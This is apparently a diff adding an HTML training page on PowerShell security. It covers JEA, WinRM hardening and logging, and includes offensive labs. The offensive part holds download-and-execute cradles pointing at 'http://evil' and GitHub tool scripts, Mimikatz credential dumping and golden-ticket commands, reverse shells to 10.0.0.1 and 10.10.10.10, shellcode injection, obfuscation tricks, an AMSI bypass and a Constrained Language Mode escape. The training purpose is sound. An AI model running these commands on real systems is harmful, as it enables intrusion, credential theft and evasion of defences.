+FunctionDefinitions = @{
+    Name = 'Get-UserInfo'
+    ScriptBlock = { param($Username) Invoke-Expression "net user $Username" }  # INJECTABLE
+}
+
+# 5. Missing TranscriptDirectory — no audit trail
+# 6. RunAsVirtualAccount with too many group memberships</code></pre>
+
+        <!-- POWERSHELL REMOTING -->
+        <h2>PowerShell Remoting / WinRM</h2>
+        <p>PowerShell remoting uses WS-Management protocol over HTTP (5985) or HTTPS (5986) via the WinRM service.</p>
+
+        <h3>Configuration</h3>
+<pre><code class="language-powershell"># Enable PSRemoting (requires admin)
+Enable-PSRemoting -Force
+# This does:
+# 1. Starts WinRM service, sets to auto-start
+# 2. Creates HTTP listener on port 5985
+# 3. Creates firewall exception
+# 4. Registers default session configurations
+
+# Verify WinRM configuration
+winrm get winrm/config
+winrm enumerate winrm/config/listener
+
+# Configure HTTPS listener (requires certificate)
+$cert = Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.Subject -match 'CN=server01' }
+New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address * -CertificateThumbPrint $cert.Thumbprint
+
+# Trusted hosts (for non-domain environments)
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.*"
+
+# Test connectivity
+Test-WSMan -ComputerName Server01
+Test-WSMan -ComputerName Server01 -Authentication Default -Credential (Get-Credential)</code></pre>
+
+        <h3>Session Types</h3>
+<pre><code class="language-powershell"># Interactive session (1:1)
+Enter-PSSession -ComputerName Server01 -Credential $cred
+# You get a prompt: [Server01]: PS C:\>
+Exit-PSSession
+
+# Fan-out command execution (1:many, parallel)
+Invoke-Command -ComputerName Server01,Server02,Server03 -ScriptBlock {
+    Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
+} -Credential $cred
+
+# Persistent sessions (reusable, maintains state)
+$sessions = New-PSSession -ComputerName Server01,Server02 -Credential $cred
+Invoke-Command -Session $sessions -ScriptBlock { $global:x = 42 }
+Invoke-Command -Session $sessions -ScriptBlock { $global:x }  # Returns 42
+Remove-PSSession $sessions
+
+# Disconnected sessions (survive network drops)
+$s = New-PSSession -ComputerName Server01 -Name "LongRunning"
+Invoke-Command -Session $s -ScriptBlock { Start-Sleep 3600; Get-EventLog -LogName System -Newest 100 } -AsJob
+Disconnect-PSSession $s
+# Later, from any machine:
+$s = Get-PSSession -ComputerName Server01 -Name "LongRunning"
+Connect-PSSession $s
+Receive-PSSession $s</code></pre>
+
+        <h3>The Double-Hop Problem</h3>
+        <p>When you remote to Server A and try to access Server B from that session, your credentials don't follow. This is because Kerberos doesn't delegate by default.</p>
+
+<pre><code class="language-powershell"># Problem: This fails from a remoting session
+Invoke-Command -ComputerName ServerA -ScriptBlock {
+    # From ServerA, trying to reach ServerB — NO credentials available
+    Get-Content \\ServerB\Share\file.txt  # ACCESS DENIED
+}
+
+# Solutions:
+
+# 1. CredSSP (allows credential delegation — risky!)
+Enable-WSManCredSSP -Role Client -DelegateComputer ServerA -Force
+Enable-WSManCredSSP -Role Server -Force  # On ServerA
+Invoke-Command -ComputerName ServerA -Credential $cred -Authentication CredSSP -ScriptBlock {
+    Get-Content \\ServerB\Share\file.txt  # Works
+}
+# Risk: ServerA stores your credentials in memory — if compromised, attacker gets creds
+
+# 2. Kerberos Constrained Delegation (preferred, requires AD config)
+# Set on ServerA's AD computer object: Trust this computer for delegation to specific services
+# Use Set-ADComputer or AD Users and Computers GUI
+
+# 3. Resource-Based Constrained Delegation (no AD admin needed on target)
+Set-ADComputer ServerB -PrincipalsAllowedToDelegateToAccount (Get-ADComputer ServerA)
+
+# 4. Just pass credentials explicitly in the second hop
+Invoke-Command -ComputerName ServerA -ScriptBlock {
+    $cred2 = New-Object PSCredential("DOMAIN\user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
+    Invoke-Command -ComputerName ServerB -Credential $cred2 -ScriptBlock { whoami }
+}
+
+# 5. PSSessionConfiguration with RunAs account on ServerA
+Register-PSSessionConfiguration -Name WithCreds -RunAsCredential (Get-Credential) -Force</code></pre>
+
+        <h3>Security Hardening</h3>
+<pre><code class="language-powershell"># 1. Use HTTPS only
+# Delete HTTP listener
+Remove-Item WSMan:\localhost\Listener\Listener_*_HTTP -Recurse
+# Ensure HTTPS listener exists (see above)
+
+# 2. Certificate-based authentication
+# Client presents certificate; map to AD account via subject/issuer
+
+# 3. Restrict who can connect
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -ShowSecurityDescriptorUI
+# Or via SDDL:
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -SecurityDescriptorSddl "O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;S-1-5-21-xxx)"
+
+# 4. Network-level restrictions (source IP allowlisting)
+Set-Item WSMan:\localhost\Service\IPv4Filter -Value "192.168.1.0/24"
+
+# 5. Disable remoting when not needed
+Disable-PSRemoting -Force
+
+# 6. Use JEA endpoints instead of default full sessions
+# 7. Enable audit logging (transcription + module logging)
+# 8. Disable basic auth (prevents credential exposure over HTTP)
+Set-Item WSMan:\localhost\Service\Auth\Basic -Value $false</code></pre>
+
+        <!-- OFFENSIVE POWERSHELL -->
+        <h2>Offensive PowerShell</h2>
+        <p>Common tools and techniques used by red teamers and attackers in PowerShell-based operations.</p>
+
+        <h3>PowerView (Domain Enumeration)</h3>
+<pre><code class="language-powershell"># Load PowerView
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+
+# Domain enumeration
+Get-Domain                          # Current domain info
+Get-DomainController                # All DCs
+Get-DomainUser                      # All domain users
+Get-DomainUser -Identity svc_admin  # Specific user details
+Get-DomainUser -SPN                 # Kerberoastable accounts
+Get-DomainUser -AdminCount          # Protected users (AdminSDHolder)
+
+# Group enumeration
+Get-DomainGroup                     # All groups
+Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
+Get-DomainGroup -AdminCount         # Protected groups
+
+# Computer enumeration
+Get-DomainComputer                  # All computers
+Get-DomainComputer -OperatingSystem "*Server*"
+Get-DomainComputer -Unconstrained   # Unconstrained delegation
+
+# ACL enumeration
+Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs  # Look for exploitable ACLs
+
+# Privilege hunting
+Find-LocalAdminAccess               # Where current user is local admin
+Find-DomainUserLocation             # Where target users are logged in
+Get-NetSession -ComputerName dc01   # Active sessions on target
+
+# Share enumeration
+Find-DomainShare -CheckShareAccess  # Accessible shares
+Find-InterestingDomainShareFile     # Interesting files in shares
+
+# Trust enumeration
+Get-DomainTrust                     # Domain trusts
+Get-ForestTrust                     # Forest trusts
+Get-DomainForeignGroupMember        # Users from other domains</code></pre>
+
+        <h3>PowerUp (Privilege Escalation)</h3>
+<pre><code class="language-powershell"># Load PowerUp
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
+
+# Run all checks
+Invoke-AllChecks | Format-List
+
+# Individual checks
+Get-UnquotedService                   # Unquoted service paths
+Get-ModifiableServiceFile             # Services with writable binaries
+Get-ModifiableService                 # Services current user can modify
+Get-ServiceDetail -Name VulnSvc       # Detailed service info
+Find-ProcessDLLHijack                 # DLL hijacking opportunities
+Find-PathDLLHijack                    # PATH-based DLL hijack
+Get-RegistryAlwaysInstallElevated     # AlwaysInstallElevated check
+Get-RegistryAutoLogon                 # Cached autologon credentials
+Get-ModifiableScheduledTaskFile       # Scheduled tasks with writable targets
+
+# Exploitation
+Invoke-ServiceAbuse -Name 'VulnSvc'   # Exploit writable service
+Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\backdoor.exe'  # Replace service binary
+Install-ServiceBinary -Name 'VulnSvc' # Install service binary payload</code></pre>
+
+        <h3>Invoke-Mimikatz (Credential Extraction)</h3>
+<pre><code class="language-powershell"># Reflectively load Mimikatz into memory (no disk touch)
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+
+# Dump credentials from LSASS
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
+
+# DCSync attack (requires Replicating Directory Changes permission)
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'
+
+# Pass-the-Hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp.local /ntlm:abc123... /run:powershell.exe"'
+
+# Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:ntlmhash /ptt"'
+
+# Execute on remote machine via PSRemoting
+Invoke-Mimikatz -ComputerName Server01</code></pre>
+
+        <h3>Nishang</h3>
+<pre><code class="language-powershell"># Reverse shells
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
+Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444
+
+# Information gathering
+Get-Information          # System info dump
+Get-PassHashes           # Local password hashes (requires admin)
+Get-LSASecret            # LSA secrets
+
+# Privilege escalation
+Invoke-PsUACme           # UAC bypass methods
+
+# Utility
+Invoke-Encode -DataToEncode "malicious command" -IsString  # Base64 encode
+Out-Word -PayloadScript "payload.ps1"   # Embed in Word doc
+Out-Excel -PayloadScript "payload.ps1"  # Embed in Excel</code></pre>
+
+        <h3>PowerShell Empire</h3>
+<pre><code class="language-powershell"># Empire architecture:
+# Listener → Stager → Agent → Post-exploitation modules
+
+# Launcher generation (encoded PowerShell stager)
+# powershell -noP -sta -w 1 -enc [BASE64_STAGER]
+
+# Common modules:
+# situational_awareness/network/powerview/get_domain_controller
+# credentials/mimikatz/logonpasswords
+# lateral_movement/invoke_psremoting
+# persistence/elevated/registry
+# privesc/powerup/allchecks
+# exfiltration/clipboard_monitor
+
+# Empire agent communication:
+# - HTTP/HTTPS listeners with jitter and rotation
+# - Malleable C2 profiles for traffic blending
+# - Key exchange for encrypted comms</code></pre>
+
+        <h3>In-Memory Execution & Cradle Variants</h3>
+<pre><code class="language-powershell"># Classic download cradle
+IEX (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')
+
+# WebClient with proxy awareness
+$wc = New-Object Net.WebClient
+$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
+$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+IEX $wc.DownloadString('http://evil/payload.ps1')
+
+# Invoke-WebRequest (PS 3.0+)
+IEX (Invoke-WebRequest -Uri 'http://evil/payload.ps1' -UseBasicParsing).Content
+
+# Invoke-RestMethod
+IEX (Invoke-RestMethod -Uri 'http://evil/payload.ps1')
+
+# .NET WebClient async
+$wc = New-Object Net.WebClient
+$wc.DownloadStringAsync([Uri]'http://evil/payload.ps1')
+Register-ObjectEvent $wc DownloadStringCompleted -Action { IEX $Event.SourceEventArgs.Result }
+
+# COM objects (Internet Explorer)
+$ie = New-Object -ComObject InternetExplorer.Application
+$ie.Navigate('http://evil/payload.ps1')
+while($ie.Busy){Start-Sleep -Milliseconds 100}
+IEX $ie.Document.body.innerText
+
+# XML document cradle
+$xml = New-Object Xml.XmlDocument
+$xml.Load('http://evil/payload.xml')
+IEX $xml.command.execute
+
+# Certutil (LOLBin download + execute)
+certutil -urlcache -split -f http://evil/payload.ps1 C:\Windows\Temp\p.ps1
+powershell -ep bypass C:\Windows\Temp\p.ps1
+
+# BitsTransfer
+Start-BitsTransfer -Source 'http://evil/payload.ps1' -Destination 'C:\Windows\Temp\p.ps1'
+
+# .NET Assembly loading (C# payload)
+$bytes = (New-Object Net.WebClient).DownloadData('http://evil/payload.exe')
+[System.Reflection.Assembly]::Load($bytes)
+[Namespace.Class]::Method()</code></pre>
+
+        <h3>.NET Reflection for Win32 API</h3>
+<pre><code class="language-powershell"># Method 1: Add-Type with DllImport (leaves artifacts, blocked in CLM)
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Kernel32 {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+}
+"@
+$addr = [Kernel32]::VirtualAlloc(0, $shellcode.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
+$thread = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
+[Kernel32]::WaitForSingleObject($thread, 0xFFFFFFFF)
+
+# Method 2: Dynamic P/Invoke via reflection (no Add-Type, works in some CLM scenarios)
+$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
+$unsafeNativeMethods = $assemblies | ForEach-Object { $_.GetTypes() } | 
+  Where-Object { $_.Name -eq 'UnsafeNativeMethods' }
+$getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
+$getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+
+# Method 3: Delegate creation via reflection
+function Get-Delegate {
+    param([IntPtr]$funcAddr, [Type[]]$argTypes, [Type]$retType)
+    $dynAssembly = New-Object Reflection.AssemblyName('InMemory')
+    $dynModule = [AppDomain]::CurrentDomain.DefineDynamicAssembly($dynAssembly, 'Run').DefineDynamicModule('InMemory', $false)
+    $dynType = $dynModule.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
+    $ctorBuilder = $dynType.DefineConstructor('RTSpecialName, HideBySig, Public', 'Standard', @([IntPtr], [IntPtr]))
+    $ctorBuilder.SetImplementationFlags('Runtime, Managed')
+    $invokeBuilder = $dynType.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes)
+    $invokeBuilder.SetImplementationFlags('Runtime, Managed')
+    $delegateType = $dynType.CreateType()
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegateType)
+}</code></pre>
+
+        <h3>Obfuscation Techniques</h3>
+<pre><code class="language-powershell"># String manipulation
+# Tick marks (ignored by PS parser)
+I`nv`oke-Ex`pression
+
+# Concatenation
+$a="Inv"; $b="oke-"; $c="Exp"; $d="ression"; &($a+$b+$c+$d) "whoami"
+
+# -replace operator
+("Invoke-Expressionx" -replace 'x','') 
+
+# -join
+(-join [char[]]@(73,69,88)) "whoami"  # IEX
+
+# Format operator
+("{0}{1}{2}" -f 'Inv','oke-Exp','ression') 
+
+# Variable-based invocation
+$exec = [ScriptBlock]::Create("Write-Host 'hello'")
+& $exec
+
+# Invoke via & or .
+& ('IEX') "whoami"
+. ('IEX') "whoami"
+
+# Base64 encoding
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
+powershell -EncodedCommand $enc
+
+# SecureString round-trip (hide strings from static analysis)
+$ss = ConvertTo-SecureString "Invoke-Mimikatz" -AsPlainText -Force
+$ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
+$cmd = [Runtime.InteropServices.Marshal]::PtrToStringAuto($ptr)
+IEX $cmd
+
+# Invoke-Obfuscation tool layers:
+# TOKEN — randomize token types (strings, variables, commands)
+# STRING — convert entire script to string concat/reorder
+# ENCODING — Base64, hex, octal, binary encoding
+# COMPRESS — GZip/Deflate compressed + IEX decompressor
+# LAUNCHER — delivery mechanism obfuscation</code></pre>
+
+      </div>
+
+      <!-- ==================== LAB TAB ==================== -->
+      <div class="tab-pane fade" id="lab" role="tabpanel">
+
+        <h2>Labs</h2>
+
+        <!-- Lab 1 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 1: Execution Policy Bypass Methods</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Practice at least 5 different methods to bypass execution policy restrictions.</p>
+            <p><strong>Setup:</strong></p>
+<pre><code class="language-powershell"># Create a test script
+Set-Content -Path C:\Lab\test.ps1 -Value 'Write-Host "Script executed successfully!" -ForegroundColor Green; whoami'
+
+# Set restrictive execution policy
+Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Restricted -Force
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Restricted -Force
+
+# Verify it's blocked
+.\test.ps1  # Should fail</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Bypass using <code>-ExecutionPolicy Bypass</code> flag</li>
+              <li>Bypass by piping script content to PowerShell stdin</li>
+              <li>Bypass using <code>IEX</code> with <code>Get-Content</code></li>
+              <li>Bypass using <code>-EncodedCommand</code></li>
+              <li>Bypass using <code>-Command</code> with dot-sourcing</li>
+              <li>Bypass by setting <code>$env:PSExecutionPolicyPreference</code></li>
+              <li>Bypass using <code>[PowerShell]::Create().AddScript()</code></li>
+            </ol>
+            <p><strong>Verification:</strong> Each method should output "Script executed successfully!" and your username.</p>
+<pre><code class="language-powershell"># Solutions
+# Method 1
+powershell.exe -ExecutionPolicy Bypass -File C:\Lab\test.ps1
+
+# Method 2
+Get-Content C:\Lab\test.ps1 | powershell.exe -NoProfile -
+
+# Method 3
+IEX (Get-Content C:\Lab\test.ps1 -Raw)
+
+# Method 4
+$bytes = [Text.Encoding]::Unicode.GetBytes((Get-Content C:\Lab\test.ps1 -Raw))
+$enc = [Convert]::ToBase64String($bytes)
+powershell.exe -EncodedCommand $enc
+
+# Method 5
+powershell.exe -Command "& { . C:\Lab\test.ps1 }"
+
+# Method 6
+$env:PSExecutionPolicyPreference = "Bypass"; .\test.ps1
+
+# Method 7
+[System.Management.Automation.PowerShell]::Create().AddScript((Get-Content C:\Lab\test.ps1 -Raw)).Invoke()</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 2 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 2: Script Block Logging — Enable, Trigger, Analyze</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Enable Script Block Logging, execute suspicious commands, then analyze the logs.</p>
+<pre><code class="language-powershell"># Step 1: Enable Script Block Logging
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+
+# Step 2: Execute suspicious content (simulated attack)
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(@'
+$client = New-Object Net.Sockets.TCPClient("10.10.10.10", 4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (IEX $data 2>&1 | Out-String)
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + "PS " + (pwd).Path + "> ")
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+'@))
+# Don't actually run — just decode to trigger logging
+[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
+
+# Also execute some PowerView-like commands
+"Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname"
+"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"
+
+# Step 3: Analyze the logs
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 20 |
+  ForEach-Object {
+    [PSCustomObject]@{
+        Time = $_.TimeCreated
+        Level = $_.Properties[0].Value  # Warning level (suspicious auto-logged = 3)
+        ScriptBlockId = $_.Properties[3].Value
+        Preview = ($_.Properties[2].Value).Substring(0, [Math]::Min(200, ($_.Properties[2].Value).Length))
+    }
+  } | Format-Table -Wrap
+
+# Step 4: Find events flagged as suspicious (Level 5 = Warning)
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104; Level=3} |
+  Select-Object TimeCreated, @{N='Script';E={$_.Properties[2].Value}} | Format-List</code></pre>
+            <p><strong>Analysis Questions:</strong></p>
+            <ol>
+              <li>Was the Base64-encoded reverse shell logged in decoded form?</li>
+              <li>Were any events automatically flagged as suspicious (Level=3/Warning)?</li>
+              <li>Can you reconstruct multi-part script blocks using ScriptBlockId?</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- Lab 3 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 3: AMSI Bypass Implementation</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Implement and test multiple AMSI bypass techniques.</p>
+<pre><code class="language-powershell"># Step 1: Verify AMSI is working
+"Invoke-Mimikatz"  # Should trigger if Defender is active
+# Or use the AMSI test string:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')  # Often flagged itself
+
+# Step 2: Method A — amsiInitFailed reflection bypass
+# Build the bypass step by step to understand it:
+$type = [Ref].Assembly.GetType(('System.Manage'+'ment.Autom'+'ation.Amsi'+'Utils'))
+$field = $type.GetField(('amsiInit'+'Failed'), 'NonPublic,Static')
+Write-Host "Current value:" $field.GetValue($null)  # Should be False
+$field.SetValue($null, $true)
+Write-Host "New value:" $field.GetValue($null)      # Now True
+
+# Test: This should now work without being blocked
+"AmsiUtils"  # Test string that normally triggers
+"Invoke-Mimikatz"  # Should pass through
+
+# Step 3: Reset and try Method B — patching AmsiScanBuffer
+# (Open new PowerShell process to reset AMSI state)
+# Then apply the memory patch from the notes section
+
+# Step 4: Verify bypass with EICAR-like test
+# The AMSI test sample: 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
+# If AMSI is active, this triggers detection
+# After bypass, it should pass through
+
+# Step 5: Document which method works on current Windows version</code></pre>
+            <p><strong>Questions:</strong></p>
+            <ol>
+              <li>Does the bypass persist across PowerShell sessions?</li>
+              <li>Is the bypass logged in Script Block Logging?</li>
+              <li>Which technique is most evasive?</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- Lab 4 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 4: Constrained Language Mode Detection and Bypass</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Detect CLM, understand restrictions, and escape to FullLanguage.</p>
+<pre><code class="language-powershell"># Step 1: Simulate CLM (use __PSLockdownPolicy for lab — NOT production-grade)
+# In a NEW PowerShell process:
+[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
+# Open new PowerShell — it should be in CLM
+
+# Step 2: Detect language mode
+$ExecutionContext.SessionState.LanguageMode  # Should show ConstrainedLanguage
+
+# Step 3: Test what's blocked
+try { [System.Runtime.InteropServices.Marshal]::ReadByte(0) } catch { "Blocked: .NET type access" }
+try { New-Object -ComObject WScript.Shell } catch { "Blocked: COM objects" }
+try { Add-Type -TypeDefinition 'public class X {}' } catch { "Blocked: Add-Type" }
+
+# Step 4: Test what still works
+Get-Process | Select-Object -First 5   # Works — cmdlets allowed
+"Hello" + " World"                      # Works — basic operations
+@{key="value"}                          # Works — hashtables
+
+# Step 5: Bypass (since this is __PSLockdownPolicy, not real AppLocker/WDAC)
+# Method A: Unset the variable and spawn new process
+[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', $null, 'Machine')
+Start-Process powershell.exe -ArgumentList '-Command', '$ExecutionContext.SessionState.LanguageMode'
+
+# Method B: PowerShell v2 (if available)
+powershell.exe -Version 2 -Command '$ExecutionContext.SessionState.LanguageMode'
+
+# Step 6: For REAL CLM (AppLocker-enforced), test writable trusted locations
+# See notes section for paths to check
+
+# Cleanup
+[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', $null, 'Machine')</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 5 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 5: JEA Endpoint Creation and Testing</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Create a JEA endpoint with limited capabilities and test its restrictions.</p>
+<pre><code class="language-powershell"># Step 1: Create module structure for role capabilities
+$modulePath = "C:\Program Files\WindowsPowerShell\Modules\LabJEA"
+New-Item -Path "$modulePath\RoleCapabilities" -ItemType Directory -Force
+
+# Step 2: Create role capability file
+New-PSRoleCapabilityFile -Path "$modulePath\RoleCapabilities\ServiceManager.psrc" `
+  -VisibleCmdlets @(
+    'Get-Service',
+    @{ Name='Restart-Service'; Parameters=@{Name='Name'; ValidateSet='Spooler','W32Time','BITS'} },
+    'Get-Process',
+    'Get-EventLog'
+  ) `
+  -VisibleExternalCommands @('C:\Windows\System32\ipconfig.exe') `
+  -VisibleFunctions @('Get-ServerStatus') `
+  -FunctionDefinitions @{
+    Name = 'Get-ServerStatus'
+    ScriptBlock = { 
+      [PSCustomObject]@{
+        ComputerName = $env:COMPUTERNAME
+        Uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+        FreeMemoryMB = [math]::Round((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024)
+      }
+    }
+  }
+
+# Step 3: Create module manifest
+New-ModuleManifest -Path "$modulePath\LabJEA.psd1" -Description "Lab JEA Module"
+
+# Step 4: Create session configuration
+New-PSSessionConfigurationFile -Path "C:\Lab\ServiceManager.pssc" `
+  -SessionType RestrictedRemoteServer `
+  -RunAsVirtualAccount `
+  -TranscriptDirectory "C:\Lab\JEATranscripts" `
+  -RoleDefinitions @{
+    "$env:COMPUTERNAME\Users" = @{ RoleCapabilities = 'ServiceManager' }
+  }
+
+# Step 5: Register endpoint
+Register-PSSessionConfiguration -Name 'ServiceManager' -Path "C:\Lab\ServiceManager.pssc" -Force
+
+# Step 6: Test the endpoint
+$session = New-PSSession -ComputerName localhost -ConfigurationName ServiceManager
+Invoke-Command -Session $session -ScriptBlock { Get-Command }  # See limited commands
+Invoke-Command -Session $session -ScriptBlock { Get-Service }  # Should work
+Invoke-Command -Session $session -ScriptBlock { Restart-Service Spooler }  # Should work
+Invoke-Command -Session $session -ScriptBlock { Restart-Service WinRM }  # Should FAIL (not in ValidateSet)
+Invoke-Command -Session $session -ScriptBlock { whoami }  # Shows virtual account
+Invoke-Command -Session $session -ScriptBlock { Get-ServerStatus }  # Custom function
+Remove-PSSession $session
+
+# Step 7: Check transcripts
+Get-ChildItem "C:\Lab\JEATranscripts" | Get-Content
+
+# Cleanup
+Unregister-PSSessionConfiguration -Name 'ServiceManager' -Force</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 6 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 6: WinRM Configuration and Security</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Configure WinRM with various authentication methods and test connectivity.</p>
+<pre><code class="language-powershell"># Step 1: Check current WinRM status
+Get-Service WinRM
+winrm get winrm/config
+
+# Step 2: Enable PSRemoting
+Enable-PSRemoting -Force -SkipNetworkProfileCheck
+
+# Step 3: Configure listeners
+# View current listeners
+Get-ChildItem WSMan:\localhost\Listener
+
+# Create HTTPS listener (requires cert)
+$cert = New-SelfSignedCertificate -DnsName $env:COMPUTERNAME -CertStoreLocation Cert:\LocalMachine\My
+New-Item -Path WSMan:\localhost\Listener -Transport HTTPS -Address * -CertificateThumbPrint $cert.Thumbprint -Force
+
+# Step 4: Test connectivity
+Test-WSMan -ComputerName localhost
+Test-WSMan -ComputerName localhost -UseSSL
+
+# Step 5: Security hardening
+# Disable HTTP (force HTTPS only)
+# Get-ChildItem WSMan:\localhost\Listener | Where-Object { $_.Keys -contains "Transport=HTTP" } | Remove-Item -Recurse
+
+# Restrict IP ranges
+# Set-Item WSMan:\localhost\Service\IPv4Filter -Value "192.168.1.0/24"
+
+# Disable Basic auth
+Set-Item WSMan:\localhost\Service\Auth\Basic -Value $false
+
+# View security settings
+Get-Item WSMan:\localhost\Service\Auth\*
+
+# Step 6: Test remoting
+$s = New-PSSession -ComputerName localhost
+Invoke-Command -Session $s -ScriptBlock { 
+    [PSCustomObject]@{
+        User = whoami
+        LanguageMode = $ExecutionContext.SessionState.LanguageMode
+        Transport = $PSSenderInfo.ConnectionString
+    }
+}
+Remove-PSSession $s
+
+# Step 7: Configure constrained endpoint
+New-PSSessionConfigurationFile -Path C:\Lab\Constrained.pssc -SessionType RestrictedRemoteServer -LanguageMode NoLanguage
+Register-PSSessionConfiguration -Name Constrained -Path C:\Lab\Constrained.pssc -Force
+
+# Cleanup
+Unregister-PSSessionConfiguration -Name Constrained -Force</code></pre>
+          </div>
+        </div>
+
+        <!-- Lab 7 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Lab 7: PowerView Domain Enumeration Simulation</h5></div>
+          <div class="card-body">
+            <p><strong>Objective:</strong> Practice domain enumeration using PowerView commands (or simulated equivalents on standalone systems).</p>
+<pre><code class="language-powershell"># If domain-joined: Load PowerView and enumerate
+# If standalone: Use these AD module equivalents or create lab objects
+
+# Option A: Domain-joined system
+Import-Module ActiveDirectory  # Or load PowerView
+
+# Basic enumeration
+Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, LastLogonDate, Enabled
+Get-ADGroup -Filter * | Select-Object Name, GroupScope, GroupCategory
+Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem
+
+# Find Kerberoastable accounts (SPN set on user accounts)
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
+  Select-Object SamAccountName, ServicePrincipalName
+
